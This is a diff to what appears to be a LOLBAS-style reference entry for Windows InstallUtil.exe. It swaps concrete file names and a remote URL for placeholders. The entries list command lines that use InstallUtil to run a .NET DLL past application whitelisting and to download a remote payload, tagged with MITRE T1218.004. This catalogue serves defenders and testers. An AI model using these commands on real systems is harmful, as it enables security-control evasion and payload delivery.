@@ -4,7 +4,7 @@ Description: The Installer tool is a command-line utility that allows you to ins
 Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
+  - Command: InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
     Description: Execute the target .NET DLL or EXE.
     Usecase: Use to execute code and bypass application whitelisting
     Category: AWL Bypass
@@ -12,9 +12,9 @@ Commands:
     MitreID: T1218.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
-      - Execute: DLL
-      - Input: Custom Format
-  - Command: InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
+      - Execute: DLL (.NET)
+      - Execute: EXE (.NET)
+  - Command: InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
     Description: Execute the target .NET DLL or EXE.
     Usecase: Use to execute code and bypass application whitelisting
     Category: Execute
@@ -22,9 +22,9 @@ Commands:
     MitreID: T1218.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
-      - Execute: DLL
-      - Input: Custom Format
-  - Command: InstallUtil.exe https://example.com/payload
+      - Execute: DLL (.NET)
+      - Execute: EXE (.NET)
+  - Command: InstallUtil.exe {REMOTEURL}
     Description: It will download a remote payload and place it in INetCache.
     Usecase: Downloads payload from remote server
     Category: Download
